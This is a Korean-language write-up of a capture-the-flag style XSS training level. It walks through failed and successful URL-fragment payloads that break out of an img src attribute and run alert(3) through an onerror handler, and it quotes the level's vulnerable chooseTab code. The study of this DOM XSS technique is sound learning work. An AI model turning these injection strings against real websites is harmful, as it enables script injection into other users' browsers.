# Level3 : That sinking feeling...

- 몇가지 일반적인 js 함수들은 어떤 스크립트든 브라우져가 실행할 수 있도록 하는 'execution sinks'라고 불린다.
- 어디서도 페이로드를 입력할 수 없기 때문에 URL바를 활용하여 문제를 풀어야한다. 즉 숨겨진 구멍을 찾아서 문제를 해결한다

![Level3%20That%20sinking%20feeling%200b601cee688a48378d51d00bddb18372/Untitled.png](Level3%20That%20sinking%20feeling%200b601cee688a48378d51d00bddb18372/Untitled.png)

- 4 ❌

    ![Level3%20That%20sinking%20feeling%200b601cee688a48378d51d00bddb18372/Untitled%201.png](Level3%20That%20sinking%20feeling%200b601cee688a48378d51d00bddb18372/Untitled%201.png)

    결과 : img 태그의 src 속성으로  cloud + {input} +.jpg가 들어간다.
    ⇒ onerror 속성을 줄 수 있는지 확인한다.

- 4.jpg" onerror=alert(3); ❌

    ![Level3%20That%20sinking%20feeling%200b601cee688a48378d51d00bddb18372/Untitled%202.png](Level3%20That%20sinking%20feeling%200b601cee688a48378d51d00bddb18372/Untitled%202.png)

    결과 : 들어가지만 인식되지 않는다.

    ⇒ 태그를 닫아서 스크립트로 실행해본다.

- 4"><script>alert(3);</script> ❌

    ![Level3%20That%20sinking%20feeling%200b601cee688a48378d51d00bddb18372/Untitled%203.png](Level3%20That%20sinking%20feeling%200b601cee688a48378d51d00bddb18372/Untitled%203.png)

    결과 : 정확히 왜 안되는지 모르겠음 

    ⇒ 스크립트 코드를 자세히 확인해본다.

- num="><img src=4 onerror=alert(3);> ❌

    ```jsx
    function chooseTab(num) {
            // Dynamically load the appropriate image.
            var html = "Image " + parseInt(num) + "<br>";
            html += "<img src='/static/level3/cloud" + num + ".jpg' />";
            $('#tabContent').html(html);

            window.location.hash = num;

            // Select the current tab
            var tabs = document.querySelectorAll('.tab');
            for (var i = 0; i < tabs.length; i++) {
              if (tabs[i].id == "tab" + parseInt(num)) {
                tabs[i].className = "tab active";
                } else {
                tabs[i].className = "tab";
              }
            }

            // Tell parent we've changed the tab
            top.postMessage(self.location.toString(), "*");
          }

          window.onload = function() { 
            chooseTab(unescape(self.location.hash.substr(1)) || "1");
          }

          // Extra code so that we can communicate with the parent page
          window.addEventListener("message", function(event){
            if (event.source == parent) {
              chooseTab(unescape(self.location.hash.substr(1)));
            }
          }, false);
    ```

    스크립트를 확인해본 결과로 num이라는변수를 통해서 Dom XSS가 가능하다는 것을 알 수 있다.

    ![Level3%20That%20sinking%20feeling%200b601cee688a48378d51d00bddb18372/Untitled%204.png](Level3%20That%20sinking%20feeling%200b601cee688a48378d51d00bddb18372/Untitled%204.png)

    결과 : 이번에도 입력은 제대로 들어갔으나 인식되지 않는다.

    ⇒ 뭔가 빼 먹은 느낌이다. 자세히 확인해본다.

- num='"><img src=4 onerror=alert(3);> ✅

    ![Level3%20That%20sinking%20feeling%200b601cee688a48378d51d00bddb18372/Untitled%205.png](Level3%20That%20sinking%20feeling%200b601cee688a48378d51d00bddb18372/Untitled%205.png)

    ![Level3%20That%20sinking%20feeling%200b601cee688a48378d51d00bddb18372/Untitled%206.png](Level3%20That%20sinking%20feeling%200b601cee688a48378d51d00bddb18372/Untitled%206.png)

    결과 :  src 부분에 '를 통해서 닫아주면 제대로 입력되어 실행된다.

    ![Level3%20That%20sinking%20feeling%200b601cee688a48378d51d00bddb18372/Untitled%207.png](Level3%20That%20sinking%20feeling%200b601cee688a48378d51d00bddb18372/Untitled%207.png)

    ![Level3%20That%20sinking%20feeling%200b601cee688a48378d51d00bddb18372/Untitled%208.png](Level3%20That%20sinking%20feeling%200b601cee688a48378d51d00bddb18372/Untitled%208.png)

- num=' onerror=alert(3)> ✅

    ![Level3%20That%20sinking%20feeling%200b601cee688a48378d51d00bddb18372/Untitled%209.png](Level3%20That%20sinking%20feeling%200b601cee688a48378d51d00bddb18372/Untitled%209.png)

    '만 있으면 된다면 태그가 아닌 속성에 대해서도 가능하지 않을까 해서 시도해봤다.

    결과 : 가능하다.

---